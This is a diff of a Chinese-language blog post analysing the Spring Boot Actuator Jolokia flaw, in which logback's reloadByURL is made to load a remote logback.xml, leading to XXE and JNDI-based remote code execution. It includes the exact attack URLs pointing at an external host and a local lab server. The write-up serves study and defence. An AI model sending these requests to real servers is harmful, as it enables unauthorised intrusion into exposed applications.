@@ -385,9 +385,18 @@ Actuators to RCE首先我们要了">
 <p>Spring Boot Actuator是Spring Boot提供用于对应用系统进行自省和监控的功能模块，基于此开发人员可以方便地对应用系统某些监控指标进行查看、统计、审计、指标收集等。 Actuator提供了基于Http端点或JMX来管理和监视应用程序</p>
 </blockquote>
 <p>说白了就是一个针对于Spring Boot的管理程序，可以直接通过http管理监视SpringBoot应用程序</p>
+<p><strong>JMX和Mbeans</strong></p>
+<blockquote>
+<p>JMX的全称为Java Management Extensions. 顾名思义，是管理Java的一种扩展。这种机制可以方便的管理、监控正在运行中的Java程序。常用于管理线程，内存，日志Level，服务重启，系统环境等。</p>
+<p>MBean：是Managed Bean的简称，可以翻译为“管理构件”。在JMX中MBean代表一个被管理的资源实例，通过MBean中暴露的方法和属性，外界可以获取被管理的资源的状态和操纵MBean的行为。</p>
+</blockquote>
+<p>通俗来讲Spring Boot Actuator就是JMX的一种具体实现，而MBean就类似于每个功能或对每种信息进行操作或观察的一个实例</p>
 <p>那么RCE是怎么实现的呢，我们首先看下第一种方式</p>
 <ol>
 <li><p><strong>jolokia</strong></p>
+<p>Jolokia是一款开源产品，用于为JMX（Java Management Extensions）技术提供HTTP API接口</p>
+<p>漏洞成因：logback JMXConfigurator 允许通过 JMX 来配置 logback。简单来说就是，它允许你从默认配置文件，指定的文件或者 URL 重新配置 logback，列出 logger 以及修改 logger 级别。jolokia在logback JMXConfigurator中提供的<code>reloadByURL</code>方法允许我们从外部URL重新加载日志的记录配置。 </p>
+<p>简单来说，就是因为Spring Boot Actuator配置不当并且其使用了Jolokia为其JMX服务提供http服务导致MBean泄露并且可以无身份认证直接通过Jolokia调用到JMX中声明好的方法</p>
 <p>如果我们的程序调用了jolokia库，那么Spring Boot会自动注册<code>/jolokia</code>路由，Jolokia允许HTTP访问所有注册的MBean，并旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012212445.png"></p>
 <p>出问题的点在哪里呢，是Logback库提供的“<strong>reloadByURL</strong>”操作，这个操作允许我们从外部URL重新加载日志配置。它可以通过导航到以下方式触发：<a target="_blank" rel="noopener" href="http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!!/artsploit.com!/logback.xml">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!!/artsploit.com!/logback.xml</a></p>
@@ -404,7 +413,9 @@ Actuators to RCE首先我们要了">
 
 <p>然后我们构造如下url<code>/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:8000!/logback.xml</code></p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012321677.png"></p>
-<p>访问就有回显，我们来分析一下url构成</p>
+<p>访问就有回显</p>
+<p><del>这里往下都是没用的分析内容，不过实在是不想白白删掉了</del></p>
+<p>我们来分析一下url构成</p>
 <p>首先是jolokia的路径注册</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">JolokiaMvcEndpoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">"jolokia"</span><span class="token punctuation">,</span> <span class="token string">"/jolokia"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -442,8 +453,10 @@ Actuators to RCE首先我们要了">
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301020001618.png"></p>
 <p>这里在recordEvents中对xml内容进行了解析，触发XXE</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301020001231.png"></p>
+<p><del>好了可以从这里开始看了</del></p>
 <p>那么RCE的内容在哪，就是我们之前说的jolokia会从JNDI中获取变量</p>
 <p><img src="https://www.hacking8.com/books/bug-product/Spring-Boot/376/media/rId41.png" alt="https://www.hacking8.com/books/bug-product/Spring-Boot/376/media/rId41.png"></p>
+<p>‘</p>
 </li>
 </ol>
 <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
